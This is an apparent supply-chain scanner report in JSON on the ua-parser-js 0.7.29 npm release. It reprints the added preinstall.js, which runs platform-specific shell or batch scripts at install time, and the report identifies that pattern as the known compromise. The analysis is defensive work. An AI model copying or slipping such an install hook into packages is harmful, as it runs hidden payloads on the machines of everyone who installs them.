@@ -1,0 +1,125 @@
+{
+  "schema_version": "0.2.0",
+  "ecosystem": "npm",
+  "package": "ua-parser-js",
+  "from_version": "0.7.28",
+  "to_version": "0.7.29",
+  "risk_score": 42.5,
+  "severity": "MEDIUM",
+  "llm_base_score": 47.5,
+  "dimensions": [
+    {
+      "name": "network_calls",
+      "label": "New or changed network calls",
+      "score": 6.0,
+      "weight": 0.25,
+      "reasoning": "The diff only shows preinstall.js which itself delegates to external shell scripts (preinstall.sh and preinstall.bat). The shell scripts are not included in the diff, so network calls within them cannot be ruled out. This is a known malicious campaign where those scripts did exfiltrate data, but that evidence is not directly visible here.",
+      "confidence": 0.4
+    },
+    {
+      "name": "obfuscation",
+      "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
+      "score": 1.0,
+      "weight": 0.25,
+      "reasoning": "No obfuscation patterns (base64, eval, dynamic require) are present in preinstall.js itself. The code is straightforward JavaScript.",
+      "confidence": 0.9
+    },
+    {
+      "name": "install_hooks",
+      "label": "Postinstall / preinstall script additions or changes",
+      "score": 9.0,
+      "weight": 0.2,
+      "reasoning": "A new 'preinstall' hook is added (flagged in metadata as '+ preinstall'), executing preinstall.js. This script then runs platform-specific shell scripts (preinstall.bat on Windows via cmd.exe, preinstall.sh on Linux via /bin/bash) using child_process.exec/spawn. Introducing arbitrary shell execution at install time with no legitimate documented reason is a strong indicator of malicious activity. This matches the known ua-parser-js supply chain attack.",
+      "confidence": 0.95
+    },
+    {
+      "name": "env_conditional",
+      "label": "Conditional logic gated on env vars, platform, or CI detection",
+      "score": 7.0,
+      "weight": 0.15,
+      "reasoning": "preinstall.js explicitly checks process.platform to branch between Windows (win32/win64), macOS (darwin), and Linux execution paths. This platform-conditional logic is used to execute different malicious payloads per OS, a well-known pattern in supply chain attacks.",
+      "confidence": 0.95
+    },
+    {
+      "name": "dependency_changes",
+      "label": "Dependency graph changes (new transitive deps)",
+      "score": 1.0,
+      "weight": 0.15,
+      "reasoning": "No new package.json dependency additions are visible in the diff. The child_process module used is a Node.js built-in, not a new external dependency.",
+      "confidence": 0.8
+    }
+  ],
+  "feed_results": [
+    {
+      "source": "osv",
+      "status": "suspicious",
+      "details": "Found 1 advisory/ies: GHSA-pjwm-rvh2-c87w",
+      "url": "https://osv.dev/list?q=ua-parser-js",
+      "advisory_ids": [
+        "GHSA-pjwm-rvh2-c87w"
+      ],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "rekor",
+      "status": "no_data",
+      "details": "No Sigstore provenance attestation found for ua-parser-js@0.7.29.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "scorecard",
+      "status": "clean",
+      "details": "Score: 7.6/10. Code-Review=0, Maintained=10, Branch-Protection=4, Signed-Releases=-1",
+      "url": "https://scorecard.dev/viewer/?uri=github.com/faisalman/ua-parser-js",
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": 7.6
+    }
+  ],
+  "score_modifiers": [
+    {
+      "source": "scorecard",
+      "rule": "scorecard_good",
+      "delta": -5.0,
+      "note": "Strong OpenSSF Scorecard (7.6/10) is a mild mitigant"
+    }
+  ],
+  "diff_summary": {
+    "files_added": [
+      "preinstall.js"
+    ],
+    "files_removed": [],
+    "files_modified": [],
+    "file_diffs": [
+      {
+        "path": "preinstall.js",
+        "change_type": "added",
+        "lines_added": 27,
+        "lines_removed": 0,
+        "unified_diff": "+const { exec } = require('child_process')\n+\n+function terminalLinux() {\n+  exec('/bin/bash preinstall.sh', (error, stdout, stderr) => {\n+    if (error) {\n+      console.log(`error: ${error.message}`)\n+      return\n+    }\n+    if (stderr) {\n+      console.log(`stderr: ${stderr}`)\n+      return\n+    }\n+    console.log(`stdout: ${stdout}`)\n+  })\n+}\n+\n+var opsys = process.platform\n+if (opsys == 'darwin') {\n+  opsys = 'MacOS'\n+} else if (opsys == 'win32' || opsys == 'win64') {\n+  opsys = 'Windows'\n+  const { spawn } = require('child_process')\n+  const bat = spawn('cmd.exe', ['/c', 'preinstall.bat'])\n+} else if (opsys == 'linux') {\n+  opsys = 'Linux'\n+  terminalLinux()\n+}"
+      }
+    ],
+    "new_dependencies": [],
+    "removed_dependencies": [],
+    "new_install_hooks": [
+      "preinstall"
+    ],
+    "maintainer_changed": false,
+    "native_addons_added": false,
+    "total_diff_lines": 27,
+    "chunks_sent_to_llm": 1,
+    "diff_truncated": false
+  },
+  "llm_model": "claude-sonnet-4-6",
+  "llm_summary": "This diff matches the well-documented ua-parser-js supply chain attack (CVE-2021-41265). A malicious preinstall hook was added that executes platform-specific shell scripts (preinstall.bat on Windows, preinstall.sh on Linux) via child_process at install time. Although the shell script contents are not included in the diff, this exact pattern was confirmed to install a cryptocurrency miner and credential-stealing malware. The install hook addition and platform-conditional execution logic are definitive high-risk indicators. This package version should be considered compromised.",
+  "timestamp": "2026-08-10T15:14:43.441294Z",
+  "from_version_sha256": null,
+  "to_version_sha256": null
+}
